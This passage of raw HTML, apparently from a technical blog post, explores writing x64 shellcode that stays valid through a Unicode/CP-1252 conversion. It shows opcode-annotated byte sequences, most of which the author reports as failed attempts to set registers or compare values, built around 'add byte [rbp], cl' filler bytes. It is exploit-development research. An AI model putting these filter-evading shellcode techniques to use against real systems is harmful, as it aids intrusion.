#0000e6;\">\"\\x1d\\x00\\xff\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">sbb</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff00ff00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:41:26 UTC --></p>\n<p>An idea to set EAX to -1. First, set the Carry Flag using STC, set EAX to 0xFF00FF00. Subtract 0xFF00FF00 + CF from EAX which sets EAX to 0xFFFFFFFF. Same problem as before.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xf9\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stc</span>                       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xb8\\x00\\xff\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff00ff00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x1d\\x00\\xff\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">sbb</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff00ff00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:41:42 UTC --></p>\n<p>This was an idea for setting EAX to 1. First, set EAX to zero. Set the Carry Flag (CF), then add CF to AL using Add with Carry (ADC). Same problem as before.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>                     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>                   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xf9\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stc</span>                         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x14\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">adc</span>   <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>                 <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:42:04 UTC --></p>\n<p>Another version to set EAX to -1. Store zero on the stack, load address into RAX and add 1. Rotate left by 31-bits to get 0x80000000. Load into EAX and use CDQ to set EDX to -1, then swap EAX and EDX. The problem is 0x99 converts to a double byte encoding.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span> <span style=\"color: #008c00;\">0</span>                 <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span> rsp               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>  rax               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xff\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">inc</span>  <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span>       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc1\\x00\\x1f\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">rol</span>  <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x1f</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>  rax               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x99\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">cdq</span>                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x92\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">xchg</span> <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">edx</span>          <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 17:39:44 UTC --></p>\n<p>I examined various ways to simulate instructions and conceded it could only work using self-modifying code. Using boolean logic with bitwise instructions (AND/XOR/OR/NOT) and some arithmetic (NEG/ADD/SUB) to select the address of where code execution should continue. The RET instruction is the only opcode that can be used to transfer execution. There&#8217;s no JMP, Jcc or CALL instructions that can be used directly.</p>\n<p>If we have to modify code to simulate boolean logic, it makes more sense to just write instructions into memory and execute it there.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x39\\xd8\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">cmp</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ebx</span>           <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:42:18 UTC --></p>\n<p>There&#8217;s no simple combination of registers used with CMP or SUB that&#8217;s compatible with CP-1252. You can compare EAX with immediate values but nothing else. The following code using CMPSD attempts to demonstrate evaluating if EAX &lt; EBX, generating a result of 0 (FALSE) or -1 (TRUE). It would have worked, except the ADD instructions before SBB generates the wrong result.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x50\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rax                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rsp                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x5e\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   rsi                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x53\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rbx                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rsp                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x5f\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   rdi                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xa7\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">cmpsd</span>                        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>                      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   rax                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x1c\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">sbb</span>   <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>                  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x50\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rax                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rsp                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   rax                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc1\\x00\\x18\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">rol</span>   <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #800000; font-weight: bold;\">ptr</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x18</span>  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   rax                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>                      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rsp                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x5f\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   rdi                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xaa\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stosb</span>                        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xaa\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stosb</span>                        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xaa\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stosb</span>                        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xaa\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stosb</span>                        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 12:40:40 UTC --></p>\n<p>Load 0xFF000700 into EAX. The Carry Flag (CF) is set using SAHF. Then subtract 0xFF000700 + CF using SBB, which sets EAX to -1 or 0xFFFFFFFF. </p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xb8\\x00\\x07\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff000700</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x9e\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">sahf</span>                     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: 